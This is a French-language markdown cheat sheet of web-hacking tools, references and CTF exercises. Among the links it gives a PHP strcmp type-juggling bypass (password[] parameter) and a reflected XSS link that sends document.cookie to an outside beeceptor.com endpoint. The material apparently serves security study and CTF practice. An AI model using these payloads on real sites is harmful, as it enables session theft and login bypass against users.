## Outils

- [Burp](https://portswigger.net/burp)
- [Jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Beeceptor](https://beeceptor.com/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

- [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)

- `curl -v site`: check les headers par exemple

## Extensions

### Firefox

- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)

### Burp

`Never trust user input`

- [Hackvertor](https://github.com/hackvertor/hackvertor)
- [JWT](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
- [Param Miner](https://github.com/portswigger/param-miner)

## Doc

- https://owasp.org/www-community/Source_Code_Analysis_Tools

- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Hacktricks](https://book.hacktricks.xyz/welcome/readme)

- [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)

Aussi:

https://brightsec.com/blog/xss/#xss-types
https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
https://excess-xss.com/

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

## Bypass filters

[SQLi: énumération via UNION](https://github.com/0x14mth3n1ght/Writeup/blob/master/2022/Star2022/Web/SQL/sql.txt)
[PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
[PHP: extract() & loose comparison](https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/web/salty)
[PHP Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdfhttps://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

`Contourner strcmp() (juggling) \ Provoquer une erreur SQL`

- GET: `?password[]=''`
- POST: `password:[]`

[Bypass Eval](https://github.com/0xchrisb/thesis-non-alphanumeric-code-generator)

[PayloadBox](https://github.com/payloadbox)

[Stored & Reflected XSS (hackndo)](https://beta.hackndo.com/attaque-xss/)

`Reflected XSS`

Report link:

```html
https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".concat(document.cookie)>
```

[Dom Based XSS](https://blog.cyxo.re/pwnme-2022/pimp-my-bicycle/)

-> appel ou accès aux éléments du DOM (ex document.getElementByID)

[CSP Bypass](https://csplite.com/csp320/)

## AST

https://seal9055.com/blog/browser/browser_architecture

## Exercices

https://alert.zeyu2001.com/
